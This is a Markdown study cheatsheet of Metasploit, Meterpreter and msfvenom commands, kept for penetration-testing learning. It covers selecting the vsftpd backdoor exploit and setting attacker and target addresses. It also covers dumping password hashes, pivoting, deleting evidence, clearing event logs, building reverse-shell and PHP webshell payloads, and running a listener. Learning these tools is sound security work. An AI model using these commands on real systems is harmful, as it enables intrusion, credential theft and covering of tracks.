---
type: reference
subject: shared
tags: [cybersecurity, reference, cheatsheet, metasploit, meterpreter, exploitation, quickref]
status: learning
created: 2026-07-02
---

# Metasploit Commands Cheatsheet ⚡

> ⚡ **Quick Reference** — Metasploit Framework and Meterpreter commands

---

## msfconsole Basics
```bash
msfconsole                    # Launch Metasploit
help                          # Show help
search vsftpd                 # Search modules
search type:exploit platform:linux   # Filtered search
use exploit/unix/ftp/vsftpd_234_backdoor  # Select module
info                          # Module details
show options                  # Required settings
set RHOSTS 192.168.1.10      # Set target
set LHOST 192.168.1.5        # Set attacker IP
set LPORT 4444               # Set listener port
run / exploit                 # Execute
back                          # Exit current module
sessions                      # List sessions
sessions -i 1                # Interact with session
background                    # Background session
exit                          # Quit Metasploit
```

## Meterpreter Commands
```bash
# System Info
sysinfo                       # OS info
getuid                        # Current user
getpid                        # Current process ID
ps                            # List processes

# File Operations
ls                            # List files
cd /tmp                       # Change directory
pwd                           # Current directory
cat /etc/passwd               # Read file
download /etc/passwd          # Download to attacker
upload /tmp/tool.sh /tmp/     # Upload to target
rm /tmp/evidence.txt          # Delete file

# Network
ipconfig / ifconfig           # Network interfaces
route                         # Routing table
portfwd add -l 8080 -p 80 -r 10.0.0.5  # Port forward

# Privilege Escalation
getsystem                     # Attempt auto-escalation (Windows)
hashdump                      # Dump password hashes (needs SYSTEM)
run post/multi/recon/local_exploit_suggester  # Find privesc paths

# Persistence & Lateral Movement
shell                         # Drop to OS shell
migrate 1234                  # Migrate to process PID
run autoroute -s 10.0.0.0/24 # Route through session

# Cleanup
clearev                       # Clear event logs (Windows)
```

## MSFvenom Payloads
```bash
# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf

# Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe

# PHP webshell
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.php

# List all payloads
msfvenom --list payloads
```

## Multi/Handler (Listener)
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
run
```
